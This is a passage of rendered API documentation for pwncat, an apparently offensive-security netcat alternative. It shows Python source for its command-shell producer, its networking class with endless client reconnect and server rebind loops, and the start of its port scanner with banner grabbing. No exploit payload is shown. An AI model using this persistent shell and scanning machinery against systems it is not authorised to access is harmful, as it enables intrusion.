            data = self.proc.stdout.readline()
        self.log.trace(<span class="hljs-string">"Command output: %s"</span>, repr(data))  <span
                                            class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:
            <span class="hljs-keyword">if</span> self.ssig.has_command_quit():
                self.log.trace(<span class="hljs-string">"COMMAND-QUIT signal ACK IOCommand.producer (2)"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
                self.__cleanup()
                <span class="hljs-keyword">return</span>
            <span class="hljs-comment"># This usually happens when sending a semicolon only to /bin/[ba]sh</span>
            <span class="hljs-comment"># which then responds with: /bin/sh: line 5: syntax error near unexpected token `;'</span>
            <span class="hljs-comment"># Afterwards the shell is corrupt and gone so we will restart it here.</span>
            self.log.error(<span class="hljs-string">"COMMAND-EOF restarting: %s"</span>, self.__opts.executable)
            self.proc = Popen(  <span class="hljs-comment"># pylint: disable=consider-using-with</span>
                self.__opts.executable,
                stdin=PIPE,
                stdout=PIPE,
                stderr=STDOUT,
                bufsize=self.__opts.bufsize,
                shell=<span class="hljs-literal">False</span>,
                env=os.environ.copy(),
            )
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">yield</span> data</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Inherited members</h3>
                    <ul class="hlist">
                        <li><code><b><a href="https://pwncat.org/pwncat.api.html#pwncat.IO"
                                        title="pwncat.IO">IO</a></b></code>:
                            <ul class="hlist">
                                <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.IO.log"
                                             title="pwncat.IO.log">log</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.IO.ssig"
                                        title="pwncat.IO.ssig">ssig</a></code>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </dd>
                <dt id="pwncat.IONetwork"><code class="flex name class">
                    <span>class <span class="ident">IONetwork</span></span>
                    <span>(</span><span>ssig, encoder, host, ports, role, srv_opts, cli_opts, sock_opts)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Pwncat implementation based on custom Socket library.</p>
                        <p>Create a Pwncat instance of either a server or a client.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>ssig</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>
                            </dt>
                            <dd>Instance of InterruptHandler.</dd>
                            <dt><strong><code>encoder</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.StringEncoder"
                                    title="pwncat.StringEncoder">StringEncoder</a></code>
                            </dt>
                            <dd>Instance of StringEncoder (Python2/3 str/byte compat).</dd>
                            <dt><strong><code>host</code></strong> :<code>str</code></dt>
                            <dd>The hostname to resolve.</dd>
                            <dt><strong><code>ports</code></strong> :<code>[int]</code></dt>
                            <dd>List of ports to connect to or listen on.</dd>
                            <dt><strong><code>role</code></strong> :<code>str</code></dt>
                            <dd>Either "server" or "client".</dd>
                            <dt><strong><code>srv_opts</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkSrv"
                                    title="pwncat.DsIONetworkSrv">DsIONetworkSrv</a></code>
                            </dt>
                            <dd>Options for the server.</dd>
                            <dt><strong><code>cli_opts</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkCli"
                                    title="pwncat.DsIONetworkCli">DsIONetworkCli</a></code>
                            </dt>
                            <dd>Options for the client.</dd>
                            <dt><strong><code>sock_opts</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkSock"
                                    title="pwncat.DsIONetworkSock">DsIONetworkSock</a></code>
                            </dt>
                            <dd>Options to parse back to Sock.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span
                                class="hljs-title">IONetwork</span>(<span
                                class="hljs-params">IO</span>):</span>
    <span class="hljs-string">"""Pwncat implementation based on custom Socket library."""</span>

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">net</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Net</span>
        <span class="hljs-string">"""Returns instance of Net."""</span>
        <span class="hljs-keyword">return</span> self.__net

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        ssig,  <span class="hljs-comment"># type: InterruptHandler</span>
        encoder,  <span class="hljs-comment"># type: StringEncoder</span>
        host,  <span class="hljs-comment"># type: str</span>
        ports,  <span class="hljs-comment"># type: List[int]</span>
        role,  <span class="hljs-comment"># type: str</span>
        srv_opts,  <span class="hljs-comment"># type: DsIONetworkSrv</span>
        cli_opts,  <span class="hljs-comment"># type: DsIONetworkCli</span>
        sock_opts,  <span class="hljs-comment"># type: DsIONetworkSock</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-string">"""Create a Pwncat instance of either a server or a client.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            host (str): The hostname to resolve.
            ports ([int]): List of ports to connect to or listen on.
            role (str): Either "server" or "client".
            srv_opts (DsIONetworkSrv):   Options for the server.
            cli_opts (DsIONetworkCli):   Options for the client.
            sock_opts (DsIONetworkSock): Options to parse back to Sock.
        """</span>
        <span class="hljs-keyword">assert</span> role <span class="hljs-keyword">in</span> [<span
                                    class="hljs-string">"server"</span>, <span class="hljs-string">"client"</span>], <span
                                    class="hljs-string">"The role must be 'server' or 'client'."</span>
        super(IONetwork, self).__init__(ssig)

        self.__role = role
        self.__net = Net(encoder, ssig, sock_opts)
        self.__sock_opts = sock_opts
        self.__srv_opts = srv_opts
        self.__cli_opts = cli_opts

        <span class="hljs-comment"># Did we already run cleanup</span>
        self.__cleaned_up = <span class="hljs-literal">False</span>

        <span class="hljs-comment"># Internally store addresses for reconn or rebind functions</span>
        self.__host = host
        self.__ports = ports
        self.__pport = <span class="hljs-number">0</span>  <span class="hljs-comment"># pointer to the current port</span>

        <span class="hljs-keyword">if</span> role == <span class="hljs-string">"server"</span>:
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__net.run_server(self.__host, self.__ports[self.__pport]):
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__server_rebind():
                    sys.exit(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">if</span> role == <span class="hljs-string">"client"</span>:
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__net.run_client(self.__host, self.__ports[self.__pport]):
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__client_reconnect_to_server():
                    sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
        <span class="hljs-string">"""Network receive generator which hooks into the receive function and adds features.

        Yields:
            str: Data received from a connected socket.
        """</span>
        <span class="hljs-comment"># Counter for receive retries once this side of the program</span>
        <span class="hljs-comment"># shuts down (e.g.: Ctrl+c) as there could be data left on the wire.</span>
        curr_recv_timeout_retry = <span class="hljs-number">0</span>

        <span class="hljs-comment"># Loop endlessly and yield data back to the caller</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-comment"># [1/3] Generate data</span>
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">yield</span> self.__net.receive()
            <span class="hljs-comment"># [2/3] Non-blocking socket is finished receiving data and allows us to do some action</span>
            <span class="hljs-keyword">except</span> socket.timeout <span
                                    class="hljs-keyword">as</span> err:
                <span class="hljs-comment"># Check if we close the socket for sending</span>
                <span class="hljs-keyword">if</span> self.ssig.has_sock_send_eof():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"SOCK-SEND-EOF signal ACK in IONetwork.producer [1]: %s"</span>, err
                    )
                    self.__net.send_eof()

                <span class="hljs-comment"># Let's ask the interrupter() function if we should terminate?</span>
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.ssig.has_sock_quit():
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-comment"># Stop signal is raied when my own side of the network was closed.</span>
                <span class="hljs-comment"># Happened most likely that the user pressed Ctrl+c</span>
                <span class="hljs-comment"># Before quitting, we will check x many times, if there is still</span>
                <span class="hljs-comment"># data left to receive, before shutting down.</span>
                <span class="hljs-keyword">if</span> curr_recv_timeout_retry &lt; self.__sock_opts.recv_timeout_retry:
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"Final socket read: %d/%d before quitting."</span>,
                        curr_recv_timeout_retry + <span class="hljs-number">1</span>,
                        self.__sock_opts.recv_timeout_retry,
                    )
                    curr_recv_timeout_retry += <span class="hljs-number">1</span>
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-comment"># We ware all done reading, shut down</span>
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.producer [1]: %s"</span>, err
                )
                self.__cleanup()
                <span class="hljs-keyword">return</span>
            <span class="hljs-comment"># [3/3] Connection was closed remotely (EOF) or locally (Ctrl+C or similar)</span>
            <span class="hljs-keyword">except</span> (EOFError, AttributeError, socket.error) <span
                                    class="hljs-keyword">as</span> err:
                <span class="hljs-comment"># Do we have a stop signal?</span>
                <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.producer [2]: %s"</span>, err
                    )
                    self.__cleanup()
                    <span class="hljs-keyword">return</span>
                <span class="hljs-comment"># Do we re-accept new clients?</span>
                <span class="hljs-keyword">if</span> self.__sock_opts.udp:
                    <span class="hljs-comment"># Always accept new clients or reconnect in UDP mode (its stateless)</span>
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-keyword">if</span> self.__role == <span class="hljs-string">"server"</span> <span
                                    class="hljs-keyword">and</span> self.__server_reaccept_from_client():
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-keyword">if</span> self.__role == <span class="hljs-string">"client"</span> <span
                                    class="hljs-keyword">and</span> self.__client_reconnect_to_server():
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-comment"># Inform everybody that we are quitting</span>
                self.log.trace(<span class="hljs-string">"SOCK-EOF signal RAISE in IONetwork.producer"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
                self.ssig.raise_sock_eof()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; None</span>
        <span class="hljs-string">"""Send data to a socket."""</span>
        <span class="hljs-keyword">try</span>:
            self.__net.send(data)
        <span class="hljs-keyword">except</span> socket.error:
            <span class="hljs-keyword">pass</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
        self.log.trace(<span class="hljs-string">"SOCK-QUIT signal RAISE in IONetwork.interrupt"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
        self.ssig.raise_sock_quit()
        self.__cleanup()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__cleanup</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Cleanup function."""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__cleaned_up:
            self.log.trace(<span class="hljs-string">"SOCK-QUIT-CLEANUP: Closing sockets"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
            self.__net.close_conn_sock()
            self.__net.close_bind_sock()
            self.__cleaned_up = <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__client_reconnect_to_server</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Ensure the client re-connects to the remote server, if the remote server hang up.

        Returns:
            bool: Returns `True` on success and `False` on failure or stop signal requested.
        """</span>
        <span class="hljs-keyword">assert</span> self.__role == <span
                                    class="hljs-string">"client"</span>, <span class="hljs-string">"This should have been caught during arg check."</span>

        <span class="hljs-comment"># reconn &lt; 0 (endlessly)</span>
        <span class="hljs-comment"># reconn &gt; 0 (reconnect until counter reaches zero)</span>
        <span class="hljs-keyword">while</span> self.__cli_opts.reconn != <span class="hljs-number">0</span>:
            <span class="hljs-comment"># [1/6] Let's ask the interrupter() function if we should terminate?</span>
            <span class="hljs-comment"># We need a little wait here in order for the stop signal to propagate.</span>
            <span class="hljs-comment"># Don't know how fast the other threads are.</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.__clienet_reconnect_to_server [1]"</span>
                )
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

            <span class="hljs-comment"># [2/6] Wait</span>
            time.sleep(self.__cli_opts.reconn_wait)

            <span class="hljs-comment"># [3/6] Let's ask the interrupter() function if we should terminate?</span>
            <span class="hljs-comment"># In case the other threads were slower as the sleep time in [1/5]</span>
            <span class="hljs-comment"># we will check again here.</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.__clienet_reconnect_to_server [2]"</span>
                )
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

            <span class="hljs-comment"># [4/6] Increment the port numer (if --reconn-robin has multiple)</span>
            self.__pport += <span class="hljs-number">1</span>
            <span class="hljs-keyword">if</span> self.__pport == len(self.__ports):
                self.__pport = <span class="hljs-number">0</span>

            <span class="hljs-keyword">if</span> self.__cli_opts.reconn &gt; <span
                                    class="hljs-number">0</span>:
                self.log.info(
                    <span class="hljs-string">"Reconnecting to %s:%d in %.1f sec (%d more times left)"</span>,
                    self.__host,
                    self.__ports[self.__pport],
                    self.__cli_opts.reconn_wait,
                    self.__cli_opts.reconn,
                )
            <span class="hljs-keyword">else</span>:
                self.log.info(
                    <span class="hljs-string">"Reconnecting to %s:%d in %.1f sec (indefinitely)"</span>,
                    self.__host,
                    self.__ports[self.__pport],
                    self.__cli_opts.reconn_wait,
                )

            <span class="hljs-comment"># [5/6] Decrease reconnect counter</span>
            <span class="hljs-keyword">if</span> self.__cli_opts.reconn &gt; <span
                                    class="hljs-number">0</span>:
                self.__cli_opts.reconn -= <span class="hljs-number">1</span>

            <span class="hljs-comment"># [6/6] Recurse until True or reconnect count is used up</span>
            <span class="hljs-keyword">if</span> self.__net.run_client(self.__host, self.__ports[self.__pport]):
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># [5/5] Signal failure</span>
        self.log.info(<span class="hljs-string">"Reconnect count is used up. Shutting down."</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__server_rebind</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>

        <span class="hljs-comment"># rebind &lt; 0 (endlessly)</span>
        <span class="hljs-comment"># rebind &gt; 0 (rebind until counter reaches zero)</span>
        <span class="hljs-keyword">while</span> self.__srv_opts.rebind != <span class="hljs-number">0</span>:

            <span class="hljs-comment"># [1/7] Let's ask the interrupter() function if we should terminate?</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.__server_rebind [1]"</span>
                )
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

            <span class="hljs-comment"># [2/7] Increment the port numer (if --reconn-robin has multiple)</span>
            self.__pport += <span class="hljs-number">1</span>
            <span class="hljs-keyword">if</span> self.__pport == len(self.__ports):
                self.__pport = <span class="hljs-number">0</span>

            <span class="hljs-comment"># [3/7] Notify user</span>
            <span class="hljs-keyword">if</span> self.__srv_opts.rebind &gt; <span
                                    class="hljs-number">0</span>:
                self.log.info(
                    <span class="hljs-string">"Rebinding to port %d in %.1f sec (%d more times left)"</span>,
                    self.__ports[self.__pport],
                    self.__srv_opts.rebind_wait,
                    self.__srv_opts.rebind,
                )
            <span class="hljs-keyword">else</span>:
                self.log.info(
                    <span class="hljs-string">"Rebinding to port %d in %.1f sec (indefinitely)"</span>,
                    self.__ports[self.__pport],
                    self.__srv_opts.rebind_wait,
                )

            <span class="hljs-comment"># [4/7] Decrease reconnect counter</span>
            <span class="hljs-keyword">if</span> self.__srv_opts.rebind &gt; <span
                                    class="hljs-number">0</span>:
                self.__srv_opts.rebind -= <span class="hljs-number">1</span>

            <span class="hljs-comment"># [5/7] Wait (--rebind-wait)</span>
            time.sleep(self.__srv_opts.rebind_wait)

            <span class="hljs-comment"># [6/7] Let's ask the interrupter() function if we should terminate?</span>
            <span class="hljs-comment"># In case the other threads were slower as the sleep time in [1/7]</span>
            <span class="hljs-comment"># we will check again here.</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.__server_rebind [2]"</span>
                )
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

            <span class="hljs-comment"># [6/7] Recurse until True or reconnect count is used up</span>
            <span class="hljs-keyword">if</span> self.__net.run_server(self.__host, self.__ports[self.__pport]):
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># [7/7] Nope</span>
        self.log.info(<span class="hljs-string">"Rebind count is used up. Shutting down."</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__server_reaccept_from_client</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Ensure the server is able to keep connection open by re-accepting new clients.

        Returns:
            bool: True on success and False on failure
        """</span>
        <span class="hljs-comment"># Do not re-accept for UDP</span>
        <span class="hljs-keyword">assert</span> <span class="hljs-keyword">not</span> self.__sock_opts.udp, <span
                                    class="hljs-string">"This should have been caught during arg check."</span>
        <span class="hljs-keyword">assert</span> self.__role == <span
                                    class="hljs-string">"server"</span>, <span class="hljs-string">"This should have been caught during arg check."</span>

        <span class="hljs-comment"># [NO] Do not re-accept</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__srv_opts.keep_open:
            self.log.info(<span class="hljs-string">"No automatic re-accept specified. Shutting down."</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [MAYBE] Check stop signal and otherwise try until success.</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            time.sleep(<span class="hljs-number">0.01</span>)
            <span class="hljs-comment"># [NO] We have a stop signal</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.__server_reaccept_from_client"</span>
                )
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
            <span class="hljs-comment"># [YES] Re-accept indefinitely</span>
            self.log.info(<span class="hljs-string">"Re-accepting new clients"</span>)
            <span class="hljs-keyword">if</span> self.__net.re_accept_client():
                <span class="hljs-keyword">return</span> <span
                                    class="hljs-literal">True</span></code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.IO"
                               title="pwncat.IO">IO</a></li>
                        <li>abc.ABC</li>
                    </ul>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.IONetwork.net"><code class="name">var <span
                                class="ident">net</span></code></dt>
                        <dd>
                            <div class="desc"><p>Returns instance of Net.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">net</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Net</span>
    <span class="hljs-string">"""Returns instance of Net."""</span>
    <span class="hljs-keyword">return</span> self.__net</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.IONetwork.consumer"><code class="name flex">
                            <span>def <span
                                    class="ident">consumer</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Send data to a socket.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
                                        class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; None</span>
    <span class="hljs-string">"""Send data to a socket."""</span>
    <span class="hljs-keyword">try</span>:
        self.__net.send(data)
    <span class="hljs-keyword">except</span> socket.error:
        <span class="hljs-keyword">pass</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.IONetwork.interrupt"><code class="name flex">
                            <span>def <span class="ident">interrupt</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Stop function that can be called externally to
                                close this instance.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
    self.log.trace(<span class="hljs-string">"SOCK-QUIT signal RAISE in IONetwork.interrupt"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
    self.ssig.raise_sock_quit()
    self.__cleanup()</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.IONetwork.producer"><code class="name flex">
                            <span>def <span class="ident">producer</span></span>(<span>self, *args, **kwargs)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Network receive generator which hooks into the
                                receive function and adds features.</p>
                                <h2 id="yields">Yields</h2>
                                <dl>
                                    <dt><code>str</code></dt>
                                    <dd>Data received from a connected socket.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
                                        class="hljs-params">self, *args, **kwargs</span>):</span>
    <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
    <span class="hljs-string">"""Network receive generator which hooks into the receive function and adds features.

    Yields:
        str: Data received from a connected socket.
    """</span>
    <span class="hljs-comment"># Counter for receive retries once this side of the program</span>
    <span class="hljs-comment"># shuts down (e.g.: Ctrl+c) as there could be data left on the wire.</span>
    curr_recv_timeout_retry = <span class="hljs-number">0</span>

    <span class="hljs-comment"># Loop endlessly and yield data back to the caller</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-comment"># [1/3] Generate data</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">yield</span> self.__net.receive()
        <span class="hljs-comment"># [2/3] Non-blocking socket is finished receiving data and allows us to do some action</span>
        <span class="hljs-keyword">except</span> socket.timeout <span class="hljs-keyword">as</span> err:
            <span class="hljs-comment"># Check if we close the socket for sending</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_send_eof():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-SEND-EOF signal ACK in IONetwork.producer [1]: %s"</span>, err
                )
                self.__net.send_eof()

            <span class="hljs-comment"># Let's ask the interrupter() function if we should terminate?</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.ssig.has_sock_quit():
                <span class="hljs-keyword">continue</span>
            <span class="hljs-comment"># Stop signal is raied when my own side of the network was closed.</span>
            <span class="hljs-comment"># Happened most likely that the user pressed Ctrl+c</span>
            <span class="hljs-comment"># Before quitting, we will check x many times, if there is still</span>
            <span class="hljs-comment"># data left to receive, before shutting down.</span>
            <span class="hljs-keyword">if</span> curr_recv_timeout_retry &lt; self.__sock_opts.recv_timeout_retry:
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"Final socket read: %d/%d before quitting."</span>,
                    curr_recv_timeout_retry + <span class="hljs-number">1</span>,
                    self.__sock_opts.recv_timeout_retry,
                )
                curr_recv_timeout_retry += <span class="hljs-number">1</span>
                <span class="hljs-keyword">continue</span>
            <span class="hljs-comment"># We ware all done reading, shut down</span>
            self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.producer [1]: %s"</span>, err
            )
            self.__cleanup()
            <span class="hljs-keyword">return</span>
        <span class="hljs-comment"># [3/3] Connection was closed remotely (EOF) or locally (Ctrl+C or similar)</span>
        <span class="hljs-keyword">except</span> (EOFError, AttributeError, socket.error) <span
                                            class="hljs-keyword">as</span> err:
            <span class="hljs-comment"># Do we have a stop signal?</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.producer [2]: %s"</span>, err
                )
                self.__cleanup()
                <span class="hljs-keyword">return</span>
            <span class="hljs-comment"># Do we re-accept new clients?</span>
            <span class="hljs-keyword">if</span> self.__sock_opts.udp:
                <span class="hljs-comment"># Always accept new clients or reconnect in UDP mode (its stateless)</span>
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">if</span> self.__role == <span
                                            class="hljs-string">"server"</span> <span
                                            class="hljs-keyword">and</span> self.__server_reaccept_from_client():
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">if</span> self.__role == <span
                                            class="hljs-string">"client"</span> <span
                                            class="hljs-keyword">and</span> self.__client_reconnect_to_server():
                <span class="hljs-keyword">continue</span>
            <span class="hljs-comment"># Inform everybody that we are quitting</span>
            self.log.trace(<span class="hljs-string">"SOCK-EOF signal RAISE in IONetwork.producer"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
            self.ssig.raise_sock_eof()</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Inherited members</h3>
                    <ul class="hlist">
                        <li><code><b><a href="https://pwncat.org/pwncat.api.html#pwncat.IO"
                                        title="pwncat.IO">IO</a></b></code>:
                            <ul class="hlist">
                                <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.IO.log"
                                             title="pwncat.IO.log">log</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.IO.ssig"
                                        title="pwncat.IO.ssig">ssig</a></code>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </dd>
                <dt id="pwncat.IONetworkScanner"><code class="flex name class">
                    <span>class <span class="ident">IONetworkScanner</span></span>
                    <span>(</span><span>ssig, encoder, host, banner, cli_opts, sock_opts)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Pwncat Scanner implementation based on custom Socket
                        library.</p>
                        <p>Create a Pwncat Network Scanner instance.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>ssig</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>
                            </dt>
                            <dd>Instance of InterruptHandler.</dd>
                            <dt><strong><code>encoder</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.StringEncoder"
                                    title="pwncat.StringEncoder">StringEncoder</a></code>
                            </dt>
                            <dd>Instance of StringEncoder (Python2/3 str/byte compat).</dd>
                            <dt><strong><code>host</code></strong> :<code>str</code></dt>
                            <dd>The hostname to resolve.</dd>
                            <dt><strong><code>banner</code></strong> :<code>bool</code></dt>
                            <dd>Determines if we do banner grabbing as well.</dd>
                            <dt><strong><code>cli_opts</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkCli"
                                    title="pwncat.DsIONetworkCli">DsIONetworkCli</a></code>
                            </dt>
                            <dd>Options for the client.</dd>
                            <dt><strong><code>sock_opts</code></strong> :<code><a
